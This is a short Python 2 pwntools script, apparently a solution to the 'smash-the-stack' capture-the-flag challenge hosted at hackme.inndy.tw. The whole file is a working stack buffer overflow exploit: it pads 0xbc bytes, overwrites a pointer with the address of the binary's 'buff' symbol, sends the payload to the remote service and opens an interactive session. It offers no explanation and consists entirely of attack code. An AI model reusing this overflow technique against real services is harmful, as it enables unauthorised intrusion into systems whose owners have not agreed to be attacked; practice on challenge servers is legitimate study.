#!/usr/bin/env python2
from pwn import *
from LibcSearcher import *
from struct import pack
import os
context(arch = "i386",os = "linux", log_level = "debug")

p = remote("hackme.inndy.tw", 7717)
#p = process('./smash-the-stack')
elf = ELF('./smash-the-stack')

buff_bss = elf.sym['buff']

payload = 0xbc*'a' + p32(buff_bss)
p.sendline(payload)

p.interactive()
